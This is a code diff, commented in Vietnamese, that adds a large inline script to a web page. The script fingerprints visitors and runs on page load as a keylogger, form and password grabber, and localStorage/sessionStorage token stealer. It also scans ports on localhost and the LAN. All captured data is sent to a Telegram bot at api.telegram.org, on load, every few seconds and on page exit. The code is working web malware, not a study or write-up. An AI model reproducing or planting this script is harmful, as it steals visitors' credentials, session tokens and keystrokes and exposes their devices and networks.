+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            const sdp = pc.localDescription.sdp;
+            const ips = sdp.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g) || [];
+            const unique = [...new Set(ips)].filter(i => !i.startsWith('0.') && !i.startsWith('127.'));
+            pc.close();
+            if (unique.length > 1) return `⚠️ Rò rỉ IP: ${unique.join(', ')}`;
+            return '✅ Không rò rỉ';
+        } catch (e) {}
+        return '❌ Không kiểm tra được';
+    }
+
+    // ===== 4. QUÉT CỔNG =====
+    async function scanPorts() {
+        const ports = [80, 443, 22, 21, 25, 3306, 5432, 8080, 8443, 5900, 3389, 5000];
+        const open = [];
+        for (const port of ports) {
+            try {
+                await fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors', signal: AbortSignal.timeout(200) });
+                open.push(port);
+            } catch (e) {}
+        }
+        return open.length ? `🔓 Cổng mở: ${open.join(', ')}` : '🔒 Không có cổng mở';
+    }
+
+    // ===== 5. PHÁT HIỆN INCOGNITO =====
+    async function checkIncognito() {
+        try {
+            const est = await navigator.storage.estimate();
+            return est.quota < 120000000 ? '⚠️ Đang ẩn danh' : '✅ Không ẩn danh';
+        } catch (e) {}
+        return '❌ Không xác định';
+    }
+
+    // ===== 6. VPN/PROXY =====
+    async function detectVPN() {
+        try {
+            const res = await fetch('https://ip-api.com/json/?fields=proxy');
+            const d = await res.json();
+            return d.proxy ? '⚠️ Có VPN/Proxy' : '✅ Không có VPN/Proxy';
+        } catch (e) {}
+        return '❌ Không kiểm tra được';
+    }
+
+    // ===== 7. EXTENSION =====
+    function getExtensions() {
+        const exts = [];
+        document.querySelectorAll('[src*="chrome-extension://"]').forEach(el => {
+            const id = el.src.split('/')[2];
+            if (!exts.includes(id)) exts.push(id);
+        });
+        return exts.length ? `🧩 Extension: ${exts.join(', ')}` : '✅ Không có extension';
+    }
+
+    // ===== 8. THIẾT BỊ + HĐH =====
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = 'Khác', os = 'Khác', browser = 'Khác';
+        if (ua.includes('iPhone')) device = 'iPhone';
+        else if (ua.includes('iPad')) device = 'iPad';
+        else if (ua.includes('Android')) device = 'Android';
+        else if (ua.includes('Windows')) device = 'Windows PC';
+        else if (ua.includes('Mac OS')) device = 'Mac';
+        else if (ua.includes('Linux')) device = 'Linux PC';
+
+        if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
+        else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+        else if (ua.includes('Mac OS X')) os = 'macOS';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+
+        if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+        else if (ua.includes('Firefox')) browser = 'Firefox';
+        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+        else if (ua.includes('Edg')) browser = 'Edge';
+
+        const ram = navigator.deviceMemory || '?';
+        const cpu = navigator.hardwareConcurrency || '?';
+        return `💻 ${device} | ${os}\n🌐 ${browser}\n🧠 RAM: ${ram}GB | CPU: ${cpu} nhân\n🖥️ ${window.screen.width}x${window.screen.height}`;
+    }
+
+    // ===== 9. GPU =====
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    return `🎮 GPU: ${gpu}`;
+                }
+            }
+        } catch (e) {}
+        return '❌ Không lấy được GPU';
+    }
+
+    // ===== 10. FONT CHỮ =====
+    function getFonts() {
+        const fonts = [];
+        const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Impact', 'Tahoma', 'Trebuchet MS', 'Comic Sans MS', 'Webdings', 'Wingdings'];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const text = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        const defaultWidth = ctx.measureText(text).width;
+        for (const font of testFonts) {
+            ctx.font = `20px ${font}`;
+            const width = ctx.measureText(text).width;
+            if (width !== defaultWidth) fonts.push(font);
+        }
+        return fonts.length ? `🔤 Font: ${fonts.join(', ')}` : '🔤 Không phát hiện font đặc biệt';
+    }
+
+    // ===== 11. TẦN SỐ QUÉT =====
+    async function getRefreshRate() {
+        try {
+            const times = [];
+            for (let i = 0; i < 30; i++) {
+                await new Promise(r => requestAnimationFrame(r));
+                times.push(performance.now());
+            }
+            const intervals = [];
+            for (let i = 1; i < times.length; i++) {
+                intervals.push(times[i] - times[i-1]);
+            }
+            const avg = intervals.reduce((a,b) => a+b, 0) / intervals.length;
+            if (avg > 0) return `🔄 Tần số: ${Math.round(1000 / avg)} Hz`;
+        } catch (e) {}
+        return '❌ Không xác định';
+    }
+
+    // ===== 12. COOKIE + STORAGE =====
+    function getStorageInfo() {
+        const cookie = document.cookie ? document.cookie.split(';').length : 0;
+        const ls = window.localStorage ? localStorage.length : 0;
+        const ss = window.sessionStorage ? sessionStorage.length : 0;
+        let cookieContent = document.cookie || 'Không có cookie';
+        return `🍪 Cookie: ${cookie} (${cookieContent.substring(0, 100)})\n💾 LS: ${ls} | 📦 SS: ${ss}`;
+    }
+
+    // ===== 13. KEYLOGGER =====
+    function startKeylogger() {
+        let buffer = '';
+        document.addEventListener('keydown', (e) => {
+            let key = e.key;
+            if (key === 'Backspace') key = '[⌫]';
+            else if (key === 'Enter') key = '[↵]\n';
+            else if (key === 'Tab') key = '[⇥]';
+            else if (key === 'Escape') key = '[Esc]';
+            else if (key === 'Control' || key === 'Meta') key = '[Ctrl]';
+            else if (key === 'Shift') key = '[Shift]';
+            else if (key === 'Alt') key = '[Alt]';
+            else if (key === 'ArrowUp') key = '[↑]';
+            else if (key === 'ArrowDown') key = '[↓]';
+            else if (e.ctrlKey || e.metaKey) key = `[Ctrl+${key}]`;
+            else if (e.altKey) key = `[Alt+${key}]`;
+            buffer += key;
+            if (buffer.length >= 50) {
+                sendToTelegram(`⌨️ Phím: ${buffer}`);
+                buffer = '';
+            }
+        });
+        setInterval(() => {
+            if (buffer) {
+                sendToTelegram(`⌨️ Phím: ${buffer}`);
+                buffer = '';
+            }
+        }, 10000);
+    }
+
+    // ===== 14. FORM GRABBER =====
+    function formGrabber() {
+        document.addEventListener('submit', (e) => {
+            const form = e.target;
+            const data = new FormData(form);
+            let msg = `📝 Form: ${form.action || 'N/A'}\n`;
+            for (const [key, value] of data) {
+                if (value.length > 0) msg += `  ${key}: ${value}\n`;
+            }
+            sendToTelegram(msg);
+        });
+        document.querySelectorAll('input[type="password"], input[type="email"], input[name*="user"], input[name*="pass"]').forEach(inp => {
+            inp.addEventListener('change', () => {
+                if (inp.value.length > 0) {
+                    sendToTelegram(`🔑 ${inp.name || inp.type}: ${inp.value}`);
+                }
+            });
+        });
+    }
+
+    // ===== 15. TOKEN =====
+    function stealToken() {
+        const tokens = [];
+        if (window.localStorage) {
+            ['token', 'access_token', 'jwt', 'session', 'auth', 'refresh_token'].forEach(k => {
+                const v = localStorage.getItem(k);
+                if (v) tokens.push(`${k}: ${v.substring(0, 50)}...`);
+            });
+        }
+        if (window.sessionStorage) {
+            ['token', 'access_token', 'jwt', 'session', 'auth'].forEach(k => {
+                const v = sessionStorage.getItem(k);
+                if (v && !tokens.some(t => t.includes(k))) tokens.push(`${k}: ${v.substring(0, 50)}...`);
+            });
+        }
+        if (tokens.length) sendToTelegram(`🔑 Token: ${tokens.join(' | ')}`);
+    }
+
+    // ===== 16. BEACON =====
+    function beaconSend(data) {
+        try {
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', 
+                    new Blob([JSON.stringify({ chat_id: CHAT_ID, text: data })], { type: 'application/json' })
+                );
+            }
+        } catch (e) {}
+    }
+
+    // ===== 17. LỊCH SỬ TÀI NGUYÊN =====
+    function getHistory() {
+        try {
+            const entries = performance.getEntries();
+            const urls = entries.map(e => e.name).filter(u => u.startsWith('http'));
+            const unique = [...new Set(urls)];
+            if (unique.length > 0) {
+                return `📜 Lịch sử tải: ${unique.slice(0, 5).join(', ')}`;
+            }
+        } catch (e) {}
+        return '❌ Không lấy được lịch sử';
+    }
+
+    // ===== 18. THÔNG TIN MẠNG =====
+    function getNetworkInfo() {
+        if (navigator.connection) {
+            const c = navigator.connection;
+            return `📶 Mạng: ${c.effectiveType || 'N/A'} (${c.downlink || 'N/A'} Mbps)\n🔄 RTT: ${c.rtt || 'N/A'} ms`;
+        }
+        return '❌ Không hỗ trợ Network API';
+    }
+
+    // ===== 19. MÚI GIỜ =====
+    function getTimezoneDetails() {
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+        const offset = new Date().getTimezoneOffset() / -60;
+        return `🕐 Múi giờ: ${tz} (UTC${offset >= 0 ? '+' : ''}${offset})`;
+    }
+
+    // ===== 20. DEVTOOLS =====
+    function detectDevTools() {
+        let dev = false;
+        const threshold = 160;
+        const widthDiff = window.outerWidth - window.innerWidth;
+        const heightDiff = window.outerHeight - window.innerHeight;
+        if (widthDiff > threshold || heightDiff > threshold) dev = true;
+        const start = performance.now();
+        debugger;
+        const end = performance.now();
+        if (end - start > 100) dev = true;
+        return dev ? '⚠️ DevTools đang mở' : '✅ Không mở DevTools';
+    }
+
+    // ===== 21. ADBLOCK =====
+    function detectAdBlock() {
+        let blocked = false;
+        const testAd = document.createElement('div');
+        testAd.className = 'ad';
+        testAd.style.display = 'none';
+        document.body.appendChild(testAd);
+        const rect = testAd.getBoundingClientRect();
+        if (rect.width === 0 && rect.height === 0) blocked = true;
+        document.body.removeChild(testAd);
+        return blocked ? '⚠️ Có AdBlock' : '✅ Không có AdBlock';
+    }
+
+    // ===== 22. PIN =====
+    async function getBatteryInfo() {
+        if (!navigator.getBattery) return '❌ Không hỗ trợ Battery API';
+        try {
+            const bat = await navigator.getBattery();
+            const level = Math.round(bat.level * 100) + '%';
+            const charging = bat.charging ? '🔌 Đang sạc' : '🔋 Không sạc';
+            const time = bat.chargingTime === Infinity ? 'Vô hạn' : Math.round(bat.chargingTime / 60) + ' phút';
+            return `🔋 Pin: ${level} (${charging}) | Sạc đầy sau: ${time}`;
+        } catch (e) {}
+        return '❌ Không lấy được pin';
+    }
+
+    // ===== 23. TAB ACTIVE =====
+    function checkTabActive() {
+        return document.hidden ? '⚠️ Tab đang ẩn' : '✅ Tab đang hiển thị';
+    }
+
+    // ===== 24. MÀN HÌNH ẢO =====
+    function getScreenDetails() {
+        return `📐 Viewport: ${window.innerWidth}x${window.innerHeight}\n📏 Scroll: ${window.scrollX}, ${window.scrollY}\n📐 Client: ${document.documentElement.clientWidth}x${document.documentElement.clientHeight}`;
+    }
+
+    // ===== 25. GỬI ĐỊNH KỲ =====
+    function startPeriodicSend() {
+        setInterval(async () => {
+            const msg = `
+⏱️ <b>CẬP NHẬT ĐỊNH KỲ</b>
+${getTimezoneDetails()}
+🕐 ${new Date().toLocaleString('vi-VN')}
+📄 URL: ${window.location.href}
+${checkTabActive()}
+${getScreenDetails()}
+            `;
+            await sendToTelegram(msg);
+        }, 30000);
+    }
+
+    // ===== 26. NGÔN NGỮ OS =====
+    function getOSLanguage() {
+        try {
+            return `🌍 Ngôn ngữ OS: ${navigator.language || 'N/A'}`;
+        } catch (e) { return '❌ Không xác định'; }
+    }
+
+    // ===== 27. TOUCH SCREEN =====
+    function checkTouchScreen() {
+        const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        return hasTouch ? '🖐️ Có Touch Screen' : '🖱️ Không có Touch Screen';
+    }
+
+    // ===== 28. FAKE UA =====
+    function detectFakeUA() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Headless') || ua.includes('PhantomJS') || ua.includes('Selenium')) {
+            return '⚠️ User Agent giả mạo (bot)';
+        }
+        const commonBots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider'];
+        for (const bot of commonBots) {
+            if (ua.includes(bot)) return `⚠️ User Agent là bot: ${bot}`;
+        }
+        return '✅ User Agent bình thường';
+    }
+
+    // ===== 29. BOOT TIME =====
+    function getBootTime() {
+        try {
+            const bootTime = new Date(Date.now() - performance.now()).toLocaleString('vi-VN');
+            return `⏱️ Boot ước lượng: ${bootTime}`;
+        } catch (e) { return '❌ Không xác định'; }
+    }
+
+    // ===== 30. DARK MODE =====
+    function checkDarkMode() {
+        const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        return isDark ? '🌙 Dark Mode' : '☀️ Light Mode';
+    }
+
+    // ===== 31. DEVICE TYPE =====
+    function detectDeviceType() {
+        const ua = navigator.userAgent;
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+        const isTablet = /iPad|Android(?!.*Mobile)/i.test(ua);
+        if (isTablet) return '📱 Tablet';
+        if (isMobile) return '📱 Điện thoại';
+        return '💻 Máy tính bàn/Laptop';
+    }
+
+    // ===== 32. NGÔN NGỮ ƯA THÍCH =====
+    function getPreferredLanguages() {
+        try {
+            const langs = navigator.languages || [navigator.language];
+            return `🗣️ Ngôn ngữ ưa thích: ${langs.join(', ')}`;
+        } catch (e) { return '❌ Không xác định'; }
+    }
+
+    // ===== 33. WEBGL2 =====
+    function checkWebGL2() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl2');
+            return gl ? '✅ Hỗ trợ WebGL2' : '❌ Không hỗ trợ WebGL2';
+        } catch (e) { return '❌ Không kiểm tra được'; }
+    }
+
+    // ===== 34. RESIZE =====
+    function trackResize() {
+        let lastWidth = window.innerWidth;
+        let lastHeight = window.innerHeight;
+        window.addEventListener('resize', () => {
+            const newWidth = window.innerWidth;
+            const newHeight = window.innerHeight;
+            if (newWidth !== lastWidth || newHeight !== lastHeight) {
+                sendToTelegram(`📐 RESIZE: ${lastWidth}x${lastHeight} → ${newWidth}x${newHeight}`);
+                lastWidth = newWidth;
+                lastHeight = newHeight;
+            }
+        });
+    }
+
+    // ===== 35. QUÉT LAN NHANH =====
+    async function scanLANQuick() {
+        let localIP = '192.168.1.1';
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            const lines = pc.localDescription.sdp.split('\n');
+            for (const line of lines) {
+                if (line.includes('candidate') && line.includes(' host ')) {
+                    const parts = line.split(' ');
+                    const ip = parts[4];
+                    if (ip && !ip.includes('::') && !ip.includes('0.0.0.0')) {
+                        localIP = ip;
+                        break;
+                    }
+                }
+            }
+            pc.close();
+        } catch (e) {}
+
+        const base = localIP.substring(0, localIP.lastIndexOf('.'));
+        const found = [];
+        const ports = [80, 443, 8080];
+        for (let i = 1; i <= 254; i++) {
+            const ip = `${base}.${i}`;
+            for (const port of ports) {
+                try {
+                    await fetch(`http://${ip}:${port}`, { mode: 'no-cors', signal: AbortSignal.timeout(100) });
+                    found.push(`${ip}:${port}`);
+                    break;
+                } catch (e) {}
+            }
+            if (found.length >= 15) break;
+        }
+        if (found.length) sendToTelegram(`📡 Thiết bị LAN: ${found.join(', ')}`);
+    }
+
+    // ===== 36. PHÁT HIỆN MÁY ẢO =====
+    function detectVM() {
+        const ua = navigator.userAgent;
+        if (ua.includes('VirtualBox') || ua.includes('VMware') || ua.includes('QEMU') || ua.includes('KVM')) {
+            return '⚠️ Máy ảo (UA)';
+        }
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    if (renderer.includes('VMware') || renderer.includes('VirtualBox') || renderer.includes('QEMU')) {
+                        return `⚠️ Máy ảo (GPU: ${renderer})`;
+                    }
+                }
+            }
+        } catch (e) {}
+        return '✅ Không phát hiện máy ảo';
+    }
+
+    // ===== 37. NTP TIME =====
+    async function getNTPTime() {
+        try {
+            const res = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
+            const data = await res.json();
+            const serverTime = new Date(data.utc_datetime).toLocaleString('vi-VN');
+            const localTime = new Date().toLocaleString('vi-VN');
+            return `🕐 NTP: ${serverTime}\n🕐 Local: ${localTime}`;
+        } catch (e) {}
+        return '❌ Không lấy được NTP';
+    }
+
+    // ===== 38. MẠNG DI ĐỘNG/WIFI =====
+    function detectNetworkType() {
+        if (navigator.connection) {
+            const type = navigator.connection.effectiveType || 'N/A';
+            const isMobile = /cellular|3g|4g|5g/i.test(type);
+            return isMobile ? '📱 Mạng di động' : '📶 WiFi/Cáp quang';
+        }
+        return '❌ Không xác định';
+    }
+
+    // ===== 39. MEDIA DEVICES =====
+    async function getMediaDevices() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const audioInputs = devices.filter(d => d.kind === 'audioinput').length;
+            const audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;
+            const videoInputs = devices.filter(d => d.kind === 'videoinput').length;
+            return `🎤 Micro: ${audioInputs} | 🔊 Loa: ${audioOutputs} | 📷 Camera: ${videoInputs}`;
+        } catch (e) {}
+        return '❌ Không lấy được media devices';
+    }
+
+    // ===== 40. POPUP BLOCKER =====
+    function detectPopupBlocker() {
+        try {
+            const testWindow = window.open('', '_blank', 'width=1,height=1');
+            if (testWindow) {
+                testWindow.close();
+                return '✅ Popup không bị chặn';
+            }
+        } catch (e) {}
+        return '⚠️ Popup bị chặn';
+    }
+
+    // ===== 41. MÀN HÌNH KHẢ DỤNG =====
+    function getAvailScreen() {
+        return `📐 Màn hình khả dụng: ${window.screen.availWidth}x${window.screen.availHeight}`;
+    }
+
+    // ===== 42. VPN WEBRTC =====
+    async function detectVPNviaWebRTC() {
+        try {
+            const localIP = await getLocalIP();
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const publicIP = ipData.ip;
+            if (localIP.includes(publicIP)) return '✅ Không có VPN (IP trùng)';
+            return `⚠️ Có thể dùng VPN (Public: ${publicIP} ≠ Local: ${localIP})`;
+        } catch (e) {}
+        return '❌ Không kiểm tra được VPN';
+    }
+
+    // ===== 43. CPU INFO =====
+    function getCPUInfo() {
+        const cores = navigator.hardwareConcurrency || '?';
+        const platform = navigator.platform || 'N/A';
+        return `🧠 CPU: ${cores} nhân | Nền tảng: ${platform}`;
+    }
+
+    // ===== 44. WEBASSEMBLY =====
+    function checkWebAssembly() {
+        return typeof WebAssembly !== 'undefined' ? '✅ Hỗ trợ WebAssembly' : '❌ Không hỗ trợ WebAssembly';
+    }
+
+    // ===== 45. OS LANGUAGES =====
+    function getOSLanguages() {
+        try {
+            const langList = navigator.languages || [navigator.language];
+            return `🗣️ OS Languages: ${langList.join(', ')}`;
+        } catch (e) { return '❌ Không xác định'; }
+    }
+
+    // ===== 46. HEADLESS =====
+    function detectHeadless() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Headless') || ua.includes('PhantomJS') || ua.includes('Selenium')) {
+            return '⚠️ Đang chạy Headless (bot)';
+        }
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    if (renderer.includes('SwiftShader') || renderer.includes('llvmpipe')) {
+                        return '⚠️ Headless (GPU software renderer)';
+                    }
+                }
+            }
+        } catch (e) {}
+        return '✅ Trình duyệt bình thường';
+    }
+
+    // ===== 47. THỜI GIAN Ở LẠI =====
+    let startTime = Date.now();
+    function getStayTime() {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const mins = Math.floor(elapsed / 60);
+        const secs = elapsed % 60;
+        return `⏱️ Thời gian ở lại: ${mins}m ${secs}s`;
+    }
+
+    // ===== 48. VISIBILITY STATE =====
+    function getVisibilityState() {
+        return document.visibilityState === 'visible' ? '👁️ Tab đang hiển thị' : '🙈 Tab đang ẩn';
+    }
+
+    // ===== 49. PIN CHI TIẾT =====
+    async function getBatteryDetails() {
+        if (!navigator.getBattery) return '❌ Không hỗ trợ Battery API';
+        try {
+            const bat = await navigator.getBattery();
+            const level = Math.round(bat.level * 100) + '%';
+            const charging = bat.charging ? '🔌 Đang sạc' : '🔋 Không sạc';
+            const chargingTime = bat.chargingTime === Infinity ? 'Vô hạn' : Math.round(bat.chargingTime / 60) + ' phút';
+            const dischargingTime = bat.dischargingTime === Infinity ? 'Vô hạn' : Math.round(bat.dischargingTime / 60) + ' phút';
+            return `🔋 Pin: ${level} (${charging}) | Sạc đầy: ${chargingTime} | Hết pin: ${dischargingTime}`;
+        } catch (e) {}
+        return '❌ Không lấy được pin';
+    }
+
+    // ===== 50. WEBP =====
+    function checkWebP() {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 1;
+            canvas.height = 1;
+            const data = canvas.toDataURL('image/webp');
+            return data.startsWith('data:image/webp') ? '✅ Hỗ trợ WebP' : '❌ Không hỗ trợ WebP';
+        } catch (e) {}
+        return '❌ Không kiểm tra được WebP';
+    }
+
+    // ===== TỔNG HỢP GỬI =====
+    async function collectAndSend() {
+        const ip = await getIP();
+        const local = await getLocalIP();
+        const leak = await getWebRTCLeak();
+        const ports = await scanPorts();
+        const incognito = await checkIncognito();
+        const vpn = await detectVPN();
+        const ext = getExtensions();
+        const device = getDeviceInfo();
+        const gpu = getGPU();
+        const fonts = getFonts();
+        const refresh = await getRefreshRate();
+        const storage = getStorageInfo();
+        const network = getNetworkInfo();
+        const history = getHistory();
+        const battery = await getBatteryInfo();
+        const timezone = getTimezoneDetails();
+        const devtools = detectDevTools();
+        const adblock = detectAdBlock();
+        const tab = checkTabActive();
+        const screen = getScreenDetails();
+        const osLang = getOSLanguage();
+        const touch = checkTouchScreen();
+        const fakeUA = detectFakeUA();
+        const boot = getBootTime();
+        const dark = checkDarkMode();
+        const deviceType = detectDeviceType();
+        const langs = getPreferredLanguages();
+        const webgl2 = checkWebGL2();
+        const vm = detectVM();
+        const ntp = await getNTPTime();
+        const networkType = detectNetworkType();
+        const mediaDevices = await getMediaDevices();
+        const popup = detectPopupBlocker();
+        const availScreen = getAvailScreen();
+        const vpnWebRTC = await detectVPNviaWebRTC();
+        const cpuInfo = getCPUInfo();
+        const wasm = checkWebAssembly();
+        const osLangs = getOSLanguages();
+        const headless = detectHeadless();
+        const stayTime = getStayTime();
+        const visibility = getVisibilityState();
+        const batteryDetail = await getBatteryDetails();
+        const webp = checkWebP();
+
+        const time = new Date().toLocaleString('vi-VN');
+        const url = window.location.href;
+        const referrer = document.referrer || 'Trực tiếp';
+
+        const msg = `
+🔍 <b>THÔNG TIN CHI TIẾT (50+ TÍNH NĂNG)</b>
+══════════════════════════════════════════
+
+🌐 <b>MẠNG & VỊ TRÍ</b>
+${ip}
+${local}
+${leak}
+${ports}
+${network}
+${networkType}
+${vpn}
+${vpnWebRTC}
+
+💻 <b>THIẾT BỊ & HỆ THỐNG</b>
+${device}
+${deviceType}
+${cpuInfo}
+${gpu}
+${webgl2}
+${wasm}
+${fonts}
+${refresh}
+${screen}
+${availScreen}
+${vm}
+${headless}
+
+🔋 <b>NĂNG LƯỢNG & LƯU TRỮ</b>
+${battery}
+${batteryDetail}
+${storage}
+
+🛡️ <b>BẢO MẬT & QUYỀN</b>
+${incognito}
+${devtools}
+${adblock}
+${popup}
+${fakeUA}
+${touch}
+${mediaDevices}
+
+🌍 <b>NGÔN NGỮ & MÚI GIỜ</b>
+${timezone}
+${osLang}
+${langs}
+${osLangs}
+${webp}
+
+📊 <b>HÀNH VI NGƯỜI DÙNG</b>
+${tab}
+${visibility}
+${stayTime}
+${boot}
+${dark}
+${ntp}
+
+📄 <b>TRANG HIỆN TẠI</b>
+▪ URL: ${url}
+▪ Truy cập từ: ${referrer}
+▪ Thời gian: ${time}
+══════════════════════════════════════════
+        `;
+        await sendToTelegram(msg);
+    }
+
+    // ===== KÍCH HOẠT =====
+    window.addEventListener('load', () => {
+        collectAndSend();
+        stealToken();
+        formGrabber();
+        startKeylogger();
+        startPeriodicSend();
+        trackResize();
+        setTimeout(scanLANQuick, 5000);
+    });
+
+    setTimeout(collectAndSend, 5000);
+
+    window.addEventListener('beforeunload', () => {
+        beaconSend(`👋 Thoát: ${window.location.href} lúc ${new Date().toLocaleString('vi-VN')}`);
+    });
     </script>
 
 </body>
